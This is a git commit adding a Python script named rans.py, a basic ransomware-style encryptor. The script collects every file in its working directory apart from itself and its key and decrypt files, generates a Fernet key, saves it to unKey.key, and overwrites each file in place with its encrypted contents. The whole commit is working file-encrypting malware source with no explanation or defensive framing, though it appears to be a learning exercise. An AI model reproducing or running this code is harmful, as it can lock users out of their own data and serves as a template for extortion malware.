9ac48b1d83e97b49525192b165e9fd20585ca605
Jackson kanchanapally <92465955+kanchanapallyjackson@users.noreply.github.com>
2023-04-14 03:52:20 +0530

    first

---
+++ saldf/rans.py
@@ -0,0 +1,23 @@
+ #!/usr/bin/env python3
+
+import os 
+from cryptography.fernet import Fernet
+files=[]
+
+for file in os.listdir():
+	if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+print(files)
+
+key = Fernet.generate_key()
+with open("unKey.key","wb") as uk:
+	uk.write(key)
+
+for file in files:
+	with open(file,"rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted=Fernet(key).encrypt(contents)
+	with open(file,"wb") as thefile:
+		thefile.write(contents_encrypted)
